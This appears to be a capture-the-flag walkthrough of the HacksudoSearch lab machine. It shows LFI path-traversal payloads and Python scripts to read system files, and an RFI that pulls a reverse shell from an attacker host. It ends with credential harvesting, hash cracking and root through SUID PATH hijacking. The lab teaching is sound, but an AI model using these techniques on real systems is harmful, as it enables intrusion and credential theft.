I started with a nmap scan to check for open ports on the target machine

# nmap command

```bash
sudo nmap -sC -sV -oN nmap/scan 10.0.2.254
```

# nmap results

```nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 12:05 EDT
Nmap scan report for 10.0.2.254
Host is up (0.00019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 7b:44:7c:da:fb:e5:e6:1d:76:33:eb:fa:c0:dd:77:44 (RSA)
|   256 13:2d:45:07:32:83:13:eb:4e:a1:20:f4:06:ba:26:8a (ECDSA)
|_  256 21:a1:86:47:07:1b:df:b2:70:7e:d9:30:e3:29:c2:e7 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: HacksudoSearch
```

Seeing that the target machine only has ssh and http open on the machine lets visit the website,
while manually viewing the website I will run gobuster in the background

# gobuster command

```bash
gobuster dir -u http://10.0.2.254 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,js -o gobuster.log
```

# gobuster results

```bash
/images               (Status: 301) [Size: 309] [--> http://10.0.2.254/images/]
/index.php            (Status: 200) [Size: 715]                                
/search.php           (Status: 200) [Size: 165]                                
/submit.php           (Status: 200) [Size: 165]                                
/assets               (Status: 301) [Size: 309] [--> http://10.0.2.254/assets/]
/account              (Status: 301) [Size: 310] [--> http://10.0.2.254/account/]
/javascript           (Status: 301) [Size: 313] [--> http://10.0.2.254/javascript/]
/robots.txt           (Status: 200) [Size: 75]                                     
/LICENSE              (Status: 200) [Size: 1074]                                   
/search1.php          (Status: 200) [Size: 2918]                                   
/server-status        (Status: 403) [Size: 275]                                    
/crawler.php          (Status: 500) [Size: 0]
```

Viewing the robots.txt file in the browser we get a little message

```txt
/* find me * im number 1 search engine .
 just joking :) 
www.hacksudo.com
```

Seeing that the message is talking about being the number one search engine and I see that there is 
a search1.php file lets go and see what that is

Navigating to /search1.php took me to a page with a search bar and viewing the source code for the page 
revealed a comment about fuzzing

```html
<!-- find me @hacksudo.com/contact @fuzzing always best option :)  -->
```

Along with these other files

```html
<div class="topnav">
  <a class="active" href="?find=home.php">Home</a>
  <a href="?Me=about.php">About</a>
  <a href="?FUZZ=contact.php">Contact</a>
  <div class="search-container">
    <form action="submit.php">
      <input type="text" placeholder="Search.." name="search">
      <button type="submit"><i class="fa fa-search"></i></button>
    </form>
  </div>
</div>
```

So with that lets try doing some url fuzzing

# wfuzz command

```bash
wfuzz -u http://10.0.2.254/search1.php?FUZZ=contact.php --hl 137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c
```

# wfuzz results

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000001129:   200        113 L    217 W      2203 Ch     "me"
```

Seeing that wfuzz found 'me' as a url parameter that isn't in the above links we can use that and see if we can
get lfi on the target machine

Navigating to http://10.0.2.254/search1.php?me=../../../etc/passwd in the browser we get the /etc/passwd file LFI confirmed

# LFI found

```bash
root:x:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:*:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:*:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:*:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
hacksudo:x:1000:1000:hacksudo,,,:/home/hacksudo:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
monali:x:1001:1001:,,,:/home/monali:/bin/bash
john:x:1002:1002:,,,:/home/john:/bin/bash
search:x:1003:1003:,,,:/home/search:/bin/bash
```

Now that I have all the users on the target machine I will add them to a file called users in case I need 
to use them later to try and brute force any kind of login

I made a little python script that allows me to enter the file that I'm looking for on the command line
instead of going to the browser and doing it that way (you can use the browser if you want just a personal preference)

# python script

```python
#!/usr/bin/env python3

import requests
import sys

url = "http://10.0.2.254/search1.php?me=../../.."

file_to_get = sys.argv[1]

r = requests.get(url + file_to_get)

if len(r.text) != 2203:
    print(r.text)
```

After making the script you have to make it a executable like so

```bash
chmod +x exploit.py
```

Now I can run the script from the command line like this

# python script command

```bash
./exploit.py /etc/passwd
```

I also made another python script to see if I could get any ssh keys from all the users but didn't find anything

Here is the script if you are interested 

# python script

```python
#!/usr/bin/env python3

import requests

url = "http://10.0.2.254/search1.php?me=../../../"

users = [
	'hacksudo',
	'monali',
	'john',
	'search'
]

for user in users:
	r = requests.get(url + "home/" + user + "/.ssh/id_rsa")
	if len(r.text) != 2203:
		print(r.text)

```

After messing around a bit with the LFI and not really getting anything I found that I could turn the LFI into a RFI

I copied the php shell script that you can get from here http://pentestmonkey.net/tools/web-shells/php-reverse-shell 
and put it into my current directory and hosted a web server with python on my kali (attacker) machine and started
a netcat listener on port 1234 then I went to http://10.0.2.254/search1.php?me=http://10.0.2.15:8000/shell.php in the
browser and was able to get a reverse shell from the target machine 

# python server command

```bash
python3 -m http.server
```

# netcat command

```bash
nc -lvnp 1234
```

Once on the target machine I found a file called dbconnect.php inside of /var/www/html/accounts and
read the file and it gave me login credentials for the database

# creds for database login

```bash
hacksudo:p@ssword
```

That didn't get me anywhere so I found another file called .env and when I read the file it gave me other 
credentials 

```bash
www-data@HacksudoSearch:/var/www/html$ cat .env
cat .env
APP_name=HackSudoSearch
APP_ENV=local
APP_key=base64:aGFja3N1ZG8gaGVscCB5b3UgdG8gbGVhcm4gQ1RGICwgY29udGFjdCB1cyB3d3cuaGFja3N1ZG8uY29tL2NvbnRhY3QK
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USERNAME=hiraman
DB_PASSWORD=MyD4dSuperH3r0!
```

Using the DB_PASSWORD and the hacksudo username I was able to escalate to the hacksudo user I then tried to ssh into
the target machine with the same credentials and was able to login via ssh 

As the hacksudo user I was able to get the user flag

# user flag

```bash
d045e6f9feb79e94442213f9d008ac48
```

Going to the home directory of the hacksudo user I found a couple of directories and after going through a couple of them
I found a directory that had three files inside of it, one of them was a suid binary and another file had the source code
for the suid binary the last file was empty

# source code for the binary

```c
#include<unistd.h>
void main()
{ 
  setuid(0);
  setgid(0);
  system("install");
}
```

It looks like it sets the user id and the group id to 0 (root) and then runs install on the system

I couldn't find anything about how to exploit the suid binary so I downloaded linpeas on my kali machine and then 
downloaded it onto the target machine and run it. You can get linpeas from here https://github.com/carlospolop/PEASS-ng

After going through the output of linpeas it found a file in /etc called passwd.bak (a backup file of /etc/passwd), so 
I read the contents of the file and found that it had root's hashed password. I copied it onto my kali machine
and used john to crack the password

# john command

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

# john results

```bash
redhat           (?)
```

Now lets see if that is still root's password

```bash
su 

password: (redhat)

su: Authentication failure
```

No luck with the redhat password

After a couple of hours messing around with the binary and researching about suid exploitation I came across this
article https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses, it talks about
how if the binary is calling another command but is not using a absolute path you can add a custom path
to your path variable and create a malicious executable causing the suid binary to run that command/executable rather
than the real one inside of /usr/bin

So with having found that out I wrote and compiled a c program on my kali machine called install that just calls 
/bin/bash, I then downloaded it onto the target machine and made it an executable. I added the /home/search/tools/
to my path variable so that when I ran the suid binary that calls install it would run my version of install
instead of the one in /usr/bin


# install code

```c
#include<unistd.h>

void main()
{
        system("/bin/bash");
}
```

# compile install.c

```bash
gcc install.c -o install
```

# http server on kali (attack machine)

```bash
python3 -m http.server
```

# wget command on the target machine

```bash
wget http://10.0.2.15:8000/install
```

# add path variable

```bash
export PATH=/home/hacksudo/search/tools:$PATH
```

# chmod command (make install a executable)

```bash
chmod +x install
```

Now run the searchinstall command

# searchinstall command

```bash
./searchinstall
```

# proof of root

```bash
root@HacksudoSearch:~/search/tools# whoami
root
```

# root flag

```bash
 _                _                  _         ____                      _     
| |__   __ _  ___| | _____ _   _  __| | ___   / ___|  ___  __ _ _ __ ___| |__  
| '_ \ / _` |/ __| |/ / __| | | |/ _` |/ _ \  \___ \ / _ \/ _` | '__/ __| '_ \ 
| | | | (_| | (__|   <\__ \ |_| | (_| | (_) |  ___) |  __/ (_| | | | (__| | | |
|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/  |____/ \___|\__,_|_|  \___|_| |_|
You Successfully Hackudo search box 
rooted!!!

flag={9fb4c0afce26929041427c935c6e0879}
```
